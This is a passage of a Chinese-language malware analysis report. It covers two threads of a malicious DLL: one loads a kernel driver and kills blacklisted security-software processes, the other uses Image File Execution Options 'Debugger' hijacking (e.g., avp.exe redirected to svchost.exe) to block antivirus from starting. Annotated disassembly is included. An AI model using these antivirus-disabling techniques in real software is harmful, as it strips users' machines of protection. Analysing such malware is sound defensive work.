
# 线程 2

## 行为分析

从 DLL 中释放并以 SCM 方式加载 `Nskhelper2.sys` 到内核中，用于保护该进程不被结束，并枚举当前活动进程，用驱动和 Job 的方式来结束与进程黑名单中匹配的进程。

## 代码

```asm
.text:710012B7 push esi ; bInitialState  
.text:710012B8 push esi ; bManualReset  
.text:710012B9 push esi ; lpEventAttributes  
.text:710012BA call ds:CreateEventA ; 创建事件对象,初始无信号,并自动置事件有信号  
.text:710012C0 mov [esp+30h+var_20], eax  
.text:710012C4 call ds:GetLastError  
.text:710012CA cmp [esp+30h+var_20], esi  
.text:710012CE jz short loc_710012D7  
.text:710012D0 cmp eax, 183 ; 判断该对象是否已经被创建,如果是则退出进程  
.text:710012D5 jnz short loc_710012EB ; 如果该对象第一次被创建  
.text:710012D7  
.text:710012D7 loc_710012D7: ; CODE XREF: kill_SecProcess+73 j  
.text:710012D7 call sub_710011CE  
.text:710012DC test eax, eax  
.text:710012DE jnz loc_710013AC  
.text:710012E4  
.text:710012E4 loc_710012E4: ; CODE XREF: kill_SecProcess+53 j  
.text:710012E4 push esi ; uExitCode  
.text:710012E5 call ds:ExitProcess  
```

即先通过 `IS_TO_KILL` 函数判断是否与黑名单中的进程名相同，如果相同就调用 `Kill_Process` 结束掉，里面用了驱动和 Job 方式。

# 线程 3

## 行为分析

创建大量注册表项类似：

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avp.exe Debugger "svchost.exe"`

只要在进程黑名单中的都会创建相应的此表项。即使用文件映象劫持来阻止黑名单中安全软件的运行。此病毒中如果运行黑名单中的安全软件的进程，则会运行 `svchost.exe`，而不会运行它们。

## 代码

`…..前面部分略`

```asm
.text:71001CFB  
.text:71001CFB loc_71001CFB: ; CODE XREF: Create_reg_avpTo_svchost+E4 j  
.text:71001CFB push esi ; lpdwDisposition  
.text:71001CFC lea eax, [esp+24h+phkResult]  
.text:71001D00 push eax ; phkResult  
.text:71001D01 push esi ; lpSecurityAttributes  
.text:71001D02 push edi ; samDesired  
.text:71001D03 push esi ; dwOptions  
.text:71001D04 push esi ; lpClass  
.text:71001D05 push esi ; Reserved  
.text:71001D06 push offset aAvp_exe ; "avp.exe"  
.text:71001D0B push [esp+40h+hKey] ; hKey  
.text:71001D0F mov [esp+44h+phkResult], esi  
.text:71001D13 call ebx ; RegCreateKeyExA  
.text:71001D15 push 0Ch ; cbData  
.text:71001D17 push offset Data ; "svchost.exe"  
.text:71001D1C push 1 ; dwType  
.text:71001D1E push esi ; Reserved  
.text:71001D1F push offset ValueName ; "Debugger"  
.text:71001D24 push [esp+34h+phkResult] ; hKey  
.text:71001D28 call ebp ; RegSetValueExA  
.text:71001D2A push [esp+20h+phkResult] ; hKey  
.text:71001D2E call ds:RegCloseKey  
.text:71001D34 mov eax, lpSubKey  
.text:71001D39 cmp eax, esi  
.text:71001D3B jz short loc_71001D85  
.text:71001D3D mov [esp+20h+var_8], offset lpSubKey  
.text:71001D45  
.text:71001D45 loc_71001D45: ; CODE XREF: Create_reg_avpTo_svchost+D9 j  
.text:71001D45 push esi ; lpdwDisposition  
.text:71001D46 lea ecx, [esp+24h+phkResult]  
.text:71001D4A push ecx ; phkResult  
.text:71001D4B push esi ; lpSecurityAttributes  
.text:71001D4C push edi ; samDesired  
.text:71001D4D push esi ; dwOptions  
.text:71001D4E push esi ; lpClass  
.text:71001D4F push esi ; Reserved  
.text:71001D50 push eax ; lpSubKey  
.text:71001D51 push [esp+40h+hKey] ; hKey  
.text:71001D55 call ebx ; RegCreateKeyExA  
.text:71001D57 push 0Ch ; cbData  
.text:71001D59 push offset Data ; "svchost.exe"  
.text:71001D5E push 1 ; dwType  
.text:71001D60 push esi ; Reserved  
.text:71001D61 push offset ValueName ; "Debugger"  
```
